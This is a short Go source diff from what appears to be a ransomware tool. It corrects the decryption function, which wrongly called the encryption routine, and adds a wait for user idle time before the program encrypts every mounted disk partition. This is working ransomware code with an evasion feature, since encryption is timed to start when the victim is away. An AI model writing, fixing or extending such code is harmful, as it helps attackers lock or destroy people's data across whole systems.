@@ -5,6 +5,7 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"fmt"
+	"github.com/PaulDotSH/go-idle-info"
 	"github.com/shirou/gopsutil/disk"
 	"io"
 	"io/ioutil"
@@ -161,9 +162,9 @@ func DecryptEveryPartition(key []byte) {
 			defer wg.Done()
 			var err error
 			if runtime.GOOS == "windows" {
-				err = RecursivelyEncryptDirectory(partition.Mountpoint+"\\", key)
+				err = RecursivelyDecryptDirectory(partition.Mountpoint+"\\", key)
 			} else {
-				err = RecursivelyEncryptDirectory(partition.Mountpoint, key)
+				err = RecursivelyDecryptDirectory(partition.Mountpoint, key)
 			}
 			if err != nil {
 				fmt.Println(err)
@@ -179,6 +180,9 @@ func DecryptEveryPartition(key []byte) {
 func EncryptEveryPartition(key []byte) {
 	var wg sync.WaitGroup
 	partitions, _ := disk.Partitions(false)
+
+	go_idle_info.AwaitIdleTime(WaitAfk)
+
 	for _, partition := range partitions {
 		wg.Add(1)
 
